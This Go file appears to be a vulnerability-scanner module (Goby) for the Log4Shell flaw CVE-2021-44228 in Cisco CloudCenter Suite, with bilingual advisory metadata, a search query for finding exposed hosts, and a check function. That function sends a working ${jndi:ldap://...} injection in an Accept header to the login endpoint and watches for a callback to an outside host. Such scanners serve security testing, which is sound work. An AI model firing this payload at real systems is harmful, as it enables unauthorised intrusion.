package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Cisco CloudCenter Suite log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Description": "<p>Cisco CloudCenter Suite is a modular, self-managed, Kubernetes-based solution that provides all the benefits of microservice applications without the need for actual management.</p><p>Cisco CloudCenter Suite has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "Cisco CloudCenter Suite log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Cisco CloudCenter Suite",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Cisco CloudCenter Suite log4j2 命令执行漏洞（CVE-2021-44228）",
            "Description": "<p>Cisco CloudCenter Suite 是一个模块化的、自管理的、基于Kubernetes的解决方案，它提供了微服务应用程序的所有好处，而无需实际管理。<br></p><p>Cisco CloudCenter Suite&nbsp;存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>Cisco CloudCenter Suite&nbsp;存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞方案，请及时关注： <a href=\"https://github.com/apache/logging-log4j2/tags\">https://github.com/apache/logging-log4j2/tags</a></p><p></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Cisco CloudCenter Suite",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Cisco CloudCenter Suite log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Description": "<p>Cisco CloudCenter Suite is a modular, self-managed, Kubernetes-based solution that provides all the benefits of microservice applications without the need for actual management.</p><p>Cisco CloudCenter Suite has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "Cisco CloudCenter Suite log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\" target=\"_blank\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Cisco CloudCenter Suite",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "title=\"CloudCenter Suite\"",
    "GobyQuery": "title=\"CloudCenter Suite\"",
    "Author": "fmbd",
    "Homepage": "https://www.cisco.com/c/en/us/support/cloud-systems-management/cloudcenter-suite/series.html",
    "DisclosureDate": "2021-12-23",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10246"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			uri := "/suite-auth/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/json;charset=utf-8")
			cfg.Header.Store("Accept", "application/json, text/plain, */"+cmd)
			cfg.Data = "{\"username\":\"111@test.com\",\"password\":\"111\",\"tenantName\":\"111\"}"
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		nil,
	))
}
